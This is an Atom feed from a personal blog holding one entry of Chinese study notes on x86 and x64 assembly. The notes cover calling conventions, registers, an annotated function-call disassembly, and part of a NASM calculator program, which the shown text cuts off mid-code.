<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ronpa的博客</title>
  
  <subtitle>reverse; ctf; vedio games; Huang Peiheng; China University of Mining and Technology</subtitle>
  <link href="http://ronpa.top/atom.xml" rel="self"/>
  
  <link href="http://ronpa.top/"/>
  <updated>2021-01-25T19:22:04.431Z</updated>
  <id>http://ronpa.top/</id>
  
  <author>
    <name>Ronpa</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Assembly language</title>
    <link href="http://ronpa.top/2020/11/20/Assembly%20language/"/>
    <id>http://ronpa.top/2020/11/20/Assembly%20language/</id>
    <published>2020-11-20T03:11:24.000Z</published>
    <updated>2021-01-25T19:22:04.431Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>assembly language,缩写为 asm，中文译为汇编语言.<br>ARM 是一种指令集机器, 一种芯片架构, 对应的汇编arm32, arm64(两个基本上都没逆过);<br>x86表示的是CPU指令集类型; x86-64也是CPU的指令集类型, intel的 是另一种芯片架构, Windows&amp;Linux。</p><p>写到一半发现犯了根本性错误, <strong>我接触的汇编的版本其实就只有 x64 和 x86</strong>, Linux上的只是编译器不和Windows相通而已</p></blockquote><a id="more"></a><p>两种架构的区别: Intel使用CISC(复杂指令集计算机); ARM使用CISC(精简指令集计算机)</p><p>x86-64的实际例子代码参考 UCL-malware-lab</p><h1 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h1><h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><p>x86平台下常用的有三种调用约定，<code>__cdecl、__stdcall、__fastcall</code> <strong>主要区别就是 调用结束后谁来平衡堆栈</strong></p><h3 id="cdecl"><a href="#cdecl" class="headerlink" title="__cdecl"></a>__cdecl</h3><p>是C/C++的默认调用约定，如果不显示声明调用约定的情况下，就是该调用约定<br><strong>__cdecl参数从右至左入栈，然后由调用者（caller）清理栈区</strong> <br><br>如下图 主函数多了一条 add esp(用于平衡堆栈 清理 callee 开辟的栈空间)</p><p><img src="/2020/11/20/Assembly language/Assembly-language/cdecl.png" alt></p><h3 id="stdcall"><a href="#stdcall" class="headerlink" title="__stdcall"></a>__stdcall</h3><p>__stdcall 是Windows API默认调用约定，微软的WINAPI、CALLBACK等宏都是这个调用约定<br><img src="/2020/11/20/Assembly language/Assembly-language/stdcall.png" alt></p><p><strong>main函数并没有对子函数的清栈过程，<strong>stdcall参数跟</strong>cdecl入栈方式相同，从右至左入栈，被调用者（callee）清理栈区</strong> (在callee内部结束完成的栈平衡)</p><h3 id="fastcall-x86-64"><a href="#fastcall-x86-64" class="headerlink" title="__fastcall (x86-64)"></a>__fastcall (x86-64)</h3><p>是32位下一种特殊的调用约定<br><img src="/2020/11/20/Assembly language/Assembly-language/fastcall.png" alt></p><p><strong>__fastcall参数还是从右至左入栈，但是不同的是前两个参数被分别放进了ecx、edx寄存器，如果少于或等于两个参数，会先将参数放入寄存器。同样由被调用者（callee）清理栈区</strong></p><h2 id="内存结构"><a href="#内存结构" class="headerlink" title="内存结构"></a>内存结构</h2><p>代码 全局 常量 堆栈<br><img src="/2020/11/20/Assembly language/Assembly-language/内存结构.png" alt><br><img src="/2020/11/20/Assembly language/Assembly-language/64位虚拟内存.png" alt></p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">通用寄存器：<span class="number">8</span>个，分别为<span class="built_in">EAX</span>,<span class="built_in">EBX</span>,<span class="built_in">ECX</span>,<span class="built_in">EDX</span>,<span class="built_in">ESP</span>,<span class="built_in">EBP</span>,<span class="built_in">ESI</span>,<span class="built_in">EDI</span></span><br><span class="line">标志寄存器：<span class="number">1</span>个，EFLAGS</span><br><span class="line">控制寄存器：<span class="number">5</span>个，分别为<span class="built_in">CR0</span>-<span class="built_in">CR4</span></span><br><span class="line">调试寄存器：<span class="number">8</span>个，分别为<span class="built_in">DR0</span>-DR7</span><br><span class="line">系统地址寄存器:<span class="number">4</span>个，GDTR、IDTR、LDTR和TR</span><br><span class="line"><span class="number">16</span>位段寄存器：<span class="number">6</span>个，分别为<span class="built_in">CS</span>,<span class="built_in">DS</span>,<span class="built_in">ES</span>,<span class="built_in">FS</span>,<span class="built_in">GS</span>,<span class="built_in">SS</span></span><br><span class="line">其他寄存器：<span class="built_in">EIP</span>、TSC等</span><br><span class="line"></span><br><span class="line"><span class="built_in">EAX</span> 是 累加器 , 它是很多加法乘法指令的缺省寄存器。</span><br><span class="line"></span><br><span class="line"><span class="built_in">EBX</span> 是 基地址 寄存器, 在内存寻址时存放基地址。</span><br><span class="line"></span><br><span class="line"><span class="built_in">ECX</span> 是计数器 是重复(<span class="keyword">REP</span>)前缀指令和<span class="keyword">LOOP</span>指令的内定计数器。</span><br><span class="line"></span><br><span class="line"><span class="built_in">EDX</span> 则总是被用来放整数除法产生的余数。</span><br><span class="line"></span><br><span class="line"><span class="built_in">ESI</span>/<span class="built_in">EDI</span> 分别叫做<span class="string">"源/目标索引寄存器"</span> 因为在很多字符串操作指令中, <span class="built_in">DS</span>:<span class="built_in">ESI</span>指向源串,而<span class="built_in">ES</span>:<span class="built_in">EDI</span>指向目标串.</span><br><span class="line"></span><br><span class="line"><span class="built_in">EBP</span> 栈底指针  在破解的时候,经常可以看见一个标准的函数起始代码:</span><br><span class="line"></span><br><span class="line"><span class="built_in">ESP</span> 栈顶指针 堆栈的顶部是地址小的区域，压入堆栈的数据越多，<span class="built_in">ESP</span>也就越来越小。在<span class="number">32</span>位平台上，<span class="built_in">ESP</span>每次减少<span class="number">4</span>字节。</span><br><span class="line"></span><br><span class="line"><span class="built_in">eip</span>：寄存器存放下一个<span class="meta">CPU</span>指令存放的内存地址，当<span class="meta">CPU</span>执行完当前的指令后，从<span class="built_in">EIP</span>寄存器中读取下一条指令的内存地址，然后继续执行。相当于arm里的 PC <span class="built_in">r15</span></span><br></pre></td></tr></table></figure><h2 id="调用过程"><a href="#调用过程" class="headerlink" title="调用过程"></a>调用过程</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">@ILT+<span class="number">145</span>(_GetProcAddress@<span class="number">8</span>):</span><br><span class="line"><span class="number">00411096</span> <span class="keyword">jmp</span> GetProcAddress (<span class="number">41394Eh</span>)</span><br><span class="line"><span class="symbol">Add:</span></span><br><span class="line">0041109B <span class="keyword">jmp</span> <span class="keyword">Add</span> (<span class="number">411410h</span>) //这些类似函数的跳转表，走到这里会直接<span class="keyword">jmp</span>到某个函数的函数头，只需要注意这条语句，之后会用到。</span><br><span class="line">@ILT+<span class="number">155</span>(@_RTC_CheckStackVars@<span class="number">8</span>):</span><br><span class="line">004110A0 <span class="keyword">jmp</span> _RTC_CheckStackVars (<span class="number">411950h</span>)  </span><br><span class="line">…</span><br><span class="line"> <span class="keyword">int</span> <span class="keyword">Add</span>(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">00411410</span> <span class="keyword">push</span> <span class="built_in">ebp</span>//父函数的栈底指针入栈</span><br><span class="line"><span class="number">00411411</span> <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span>//栈顶变栈底</span><br><span class="line"><span class="number">00411413</span> <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">0C0h</span>//为局部变量开辟空间</span><br><span class="line"><span class="number">00411419</span> <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">0041141A <span class="keyword">push</span> <span class="built_in">esi</span></span><br><span class="line">0041141B <span class="keyword">push</span> <span class="built_in">edi</span></span><br><span class="line">0041141C <span class="keyword">lea</span> <span class="built_in">edi</span>,[<span class="built_in">ebp</span>-<span class="number">0C0h</span>]</span><br><span class="line"><span class="number">00411422</span> <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="number">30h</span></span><br><span class="line"><span class="number">00411427</span> <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0CCCCCCCCh</span></span><br><span class="line">0041142C <span class="keyword">rep</span> stos <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br><span class="line">return a+b<span class="comment">;</span></span><br><span class="line">0041142E <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [a] //取出函数参数a的值到<span class="built_in">eax</span></span><br><span class="line"><span class="number">00411431</span> <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [b] //将函数参数b的值累加到<span class="built_in">eax</span>，而<span class="built_in">eax</span>就是用来保存函数返回值的，不需要在对计算结果进行移动了</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">00411434</span> <span class="keyword">pop</span> <span class="built_in">edi</span>//恢复现场</span><br><span class="line"><span class="number">00411435</span> <span class="keyword">pop</span> <span class="built_in">esi</span></span><br><span class="line"><span class="number">00411436</span> <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line"><span class="number">00411437</span> <span class="keyword">mov</span> <span class="built_in">esp</span>,<span class="built_in">ebp</span></span><br><span class="line"><span class="number">00411439</span> <span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line">0041143A <span class="keyword">ret</span> //取出当前的栈顶，就是<span class="keyword">call</span>语句调用时压入的下一条指令地址，然后<span class="keyword">jmp</span>过去，从而实现函数返回</span><br><span class="line">… </span><br><span class="line"><span class="keyword">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">00411450</span> <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line"><span class="number">00411451</span> <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"><span class="number">00411453</span> <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">0CCh</span></span><br><span class="line"><span class="number">00411459</span> <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">0041145A <span class="keyword">push</span> <span class="built_in">esi</span></span><br><span class="line">0041145B <span class="keyword">push</span> <span class="built_in">edi</span></span><br><span class="line">0041145C <span class="keyword">lea</span> <span class="built_in">edi</span>,[<span class="built_in">ebp</span>-<span class="number">0CCh</span>]</span><br><span class="line"><span class="number">00411462</span> <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="number">33h</span></span><br><span class="line"><span class="number">00411467</span> <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0CCCCCCCCh</span></span><br><span class="line">0041146C <span class="keyword">rep</span> stos <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">Add</span>(<span class="number">1</span>,<span class="number">2</span>)<span class="comment">;</span></span><br><span class="line">0041146E <span class="keyword">push</span> <span class="number">2</span> //将函数参数压入堆栈，先从最后一个参数压起，这个顺序与调用约定有关</span><br><span class="line"><span class="number">00411470</span> <span class="keyword">push</span> <span class="number">1</span> //将函数参数压入堆栈，默认的调用约定是__cdecl，可以参考下面的调用约定表</span><br><span class="line"><span class="number">00411472</span> <span class="keyword">call</span> <span class="keyword">Add</span> (<span class="number">41109Bh</span>) //调用<span class="keyword">Add</span>函数，并将下一条指令的地址<span class="number">00411477</span>压入堆栈，之后跳转到0041109B</span><br><span class="line">而0041109B处的指令如最上面的跳转表所示，直接跳到另<span class="keyword">Add</span>函数的首地址</span><br><span class="line"><span class="number">00411477</span> <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">8</span> //弹出栈中的<span class="number">2</span>个整型函数参数，不需要赋值给任何寄存器，这里直接操作栈顶指针而没有使用<span class="keyword">pop</span></span><br><span class="line">0041147A <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [c],<span class="built_in">eax</span> //将返回值赋给变量c </span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0041147D</span> <span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">eax</span> //用<span class="built_in">eax</span>异或自身将<span class="built_in">eax</span>清零，用来作为main函数的返回值</span><br><span class="line">0041147F <span class="keyword">pop</span> <span class="built_in">edi</span></span><br><span class="line"><span class="number">00411480</span> <span class="keyword">pop</span> <span class="built_in">esi</span></span><br><span class="line"><span class="number">00411481</span> <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line"><span class="number">00411482</span> <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">0CCh</span></span><br><span class="line"><span class="number">00411488</span> <span class="keyword">cmp</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">0041148A <span class="keyword">call</span> @ILT+<span class="number">350</span>(__RTC_CheckEsp) (<span class="number">411163h</span>)</span><br><span class="line">0041148F <span class="keyword">mov</span> <span class="built_in">esp</span>,<span class="built_in">ebp</span></span><br><span class="line"><span class="number">00411491</span> <span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line"><span class="number">00411492</span> <span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p><img src="/2020/11/20/Assembly language/Assembly-language/x86函数调用.png" alt></p><h2 id="x86-循环读取数组"><a href="#x86-循环读取数组" class="headerlink" title="x86 循环读取数组"></a>x86 循环读取数组</h2><p><img src="/2020/11/20/Assembly language/Assembly-language/汇编循环语句.png" alt></p><h2 id="x86内核调用"><a href="#x86内核调用" class="headerlink" title="x86内核调用"></a>x86内核调用</h2><p>程序员调用的是API（API函数），然后通过与系统调用共同完成函数的功能。</p><h1 id="X64只有一种-fastcall-函数调用约定"><a href="#X64只有一种-fastcall-函数调用约定" class="headerlink" title="X64只有一种 fastcall 函数调用约定"></a>X64只有一种 fastcall 函数调用约定</h1><p>传递参数的过程和x86的fastcall还不一样, 同时参数的传递过程随编译器的变化变化</p><ol><li><code>gcc</code> 前六个参数依次保存在<strong>RDI, RSI, RDX, RCX, R8, R9</strong>中 (Linux)</li><li><code>vc</code> 前4个参数依次放入<strong>RCX, RDX, R8, R9</strong>中 (win)</li></ol><h2 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h2><p><img src="/2020/11/20/Assembly language/函数调用基础知识/Linux64-registers.png" alt></p><h2 id="fastcall-函数调用约定"><a href="#fastcall-函数调用约定" class="headerlink" title="fastcall 函数调用约定"></a>fastcall 函数调用约定</h2><p>不同的平台不同:</p><ol><li><code>gcc</code> 前六个参数依次保存在<strong>RDI, RSI, RDX, RCX, R8, R9</strong>中 (Linux)</li><li><code>vc</code> 前4个参数依次放入<strong>RCX, RDX, R8, R9</strong>中 (win)</li></ol><p>剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 RAX 中。(类似arm32)</p><h2 id="linuxX86和64的区别"><a href="#linuxX86和64的区别" class="headerlink" title="linuxX86和64的区别"></a>linuxX86和64的区别</h2><p>linux64与linux86的区别主要有两点：</p><ol><li>首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。</li><li>其次是函数参数的传递方式发生了改变，<strong>x86中参数都是保存在栈上(除了x86的fastcall),但在x64中的参数依次保存在(RDI, RSI,) RDX, RCX, R8和 R9中</strong>，如果还有更多的参数的话才会保存在栈上。</li></ol><h1 id="arm-和-x86-x86-64-的区别"><a href="#arm-和-x86-x86-64-的区别" class="headerlink" title="arm 和 x86/x86-64 的区别"></a>arm 和 x86/x86-64 的区别</h1><p>cpu对于机器码的每一个bit的解释都不同，arm指令集简单</p><ol><li>所有指令都是32位或者16位的 而<strong>x86不等长</strong>，所以指令预测都比x86要难做一些</li><li>寻址方式也不一样，这个就得看各个架构的reference manual了。这方面一个比较大的区别是x86使用了分段（实际上在linux中，绕过了分段模式，但是cpu确实是分段的），而arm是分页。</li><li>x86指令采用了可访问内存地址的方法 容易造成处理器和内存间的不平衡工作 降低效率 arm只用load/store指令从内存中读取数据到寄存器 每条指令中的访问内存地址不会超过一个 访问内存操作不会和算术操作混在一起</li></ol><h1 id="计算器的asm代码"><a href="#计算器的asm代码" class="headerlink" title="计算器的asm代码"></a>计算器的asm代码</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">global</span> main</span><br><span class="line"><span class="meta">extern</span> printf</span><br><span class="line"></span><br><span class="line"><span class="meta">section</span> .data</span><br><span class="line"><span class="symbol">string:</span> <span class="built_in">db</span> <span class="string">'%s'</span>, <span class="number">10</span>,<span class="number">0</span></span><br><span class="line"><span class="symbol">decimal:</span> <span class="built_in">db</span> <span class="string">'%d'</span>, <span class="number">10</span>,<span class="number">0</span></span><br><span class="line">error_msg <span class="built_in">db</span> <span class="string">'please enter the correct argument'</span>,<span class="number">0</span>,<span class="number">10h</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="symbol">fnegative:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">r9</span></span><br><span class="line">    <span class="keyword">mul</span> <span class="built_in">r12</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r9</span>,<span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">r10</span></span><br><span class="line">    <span class="keyword">mul</span> <span class="built_in">r13</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>,<span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"><span class="symbol">fsum:</span></span><br><span class="line">    <span class="keyword">call</span> fnegative</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">r9</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>,<span class="built_in">r10</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">rax</span>,<span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"><span class="symbol">fsub:</span></span><br><span class="line">    <span class="keyword">call</span> fnegative</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">r9</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>,<span class="built_in">r10</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">rax</span>,<span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"><span class="symbol">fmul:</span></span><br><span class="line">    <span class="keyword">call</span> fnegative</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">r9</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>,<span class="built_in">r10</span></span><br><span class="line"><span class="keyword">mul</span> <span class="built_in">rbx</span></span><br><span class="line"> <span class="keyword">ret</span></span><br><span class="line"><span class="symbol">fdiv:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">r9</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>,<span class="built_in">r10</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdx</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">div</span> <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span>            <span class="comment">;store rax</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">r12</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="built_in">r13</span></span><br><span class="line"><span class="keyword">mul</span> <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">jz</span> div_negative</span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">mul</span> <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">div_negative:</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line"> <span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">calculate:</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">0x2B</span></span><br><span class="line">    <span class="keyword">jnz</span> <span class="keyword">sub</span></span><br><span class="line">    <span class="keyword">call</span>  fsum</span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"><span class="symbol">sub:</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">0x2D</span></span><br><span class="line">    <span class="keyword">jnz</span> <span class="keyword">mul</span></span><br><span class="line">    <span class="keyword">call</span>  <span class="keyword">fsub</span></span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"><span class="symbol">mul:</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">0x2A</span></span><br><span class="line">    <span class="keyword">jnz</span> <span class="keyword">div</span></span><br><span class="line">    <span class="keyword">call</span>  <span class="keyword">fmul</span></span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"><span class="symbol">div:</span></span><br><span class="line">    <span class="keyword">call</span>  <span class="keyword">fdiv</span></span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="symbol">check_start:</span>                <span class="comment">; check the start of each int</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">0x39</span></span><br><span class="line">    <span class="keyword">ja</span> check_fail_start</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">0x30</span></span><br><span class="line">    <span class="keyword">jae</span> check_pass_start</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">0x2D</span></span><br><span class="line">    <span class="keyword">jnz</span> check_fail_start</span><br><span class="line"><span class="symbol">check_pass_start:</span></span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"><span class="symbol">check_fail_start:</span></span><br><span class="line">    <span class="keyword">jmp</span> error</span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">check_int:</span>                  <span class="comment">;check each charactor of argument are number</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">0x39</span></span><br><span class="line">    <span class="keyword">ja</span> check_fail_int</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">0x30</span></span><br><span class="line">    <span class="keyword">jl</span> check_fail_int</span><br><span class="line"><span class="symbol">check_pass_int:</span></span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"><span class="symbol">check_fail_int:</span></span><br><span class="line">    <span class="keyword">jmp</span> error</span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">main:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rcx</span>, <span class="built_in">rdi</span>            <span class="comment">; argc</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="number">0</span>              <span class="comment">; int2</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r11</span>,<span class="number">0</span>               <span class="comment">; op</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r12</span>,<span class="number">1</span>               <span class="comment">; negtive flag</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r13</span>,<span class="number">1</span>               <span class="comment">; negtive flag</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r14</span>, <span class="built_in">qword</span> [<span class="built_in">rsi</span>+<span class="number">8</span>]  <span class="comment">; argv</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rcx</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">jnz</span> error   <span class="comment">;check the number of calculater</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r8</span>, <span class="number">0</span>               <span class="comment">; offset</span></span><br><span class="line">    <span class="keyword">mov</span> <span 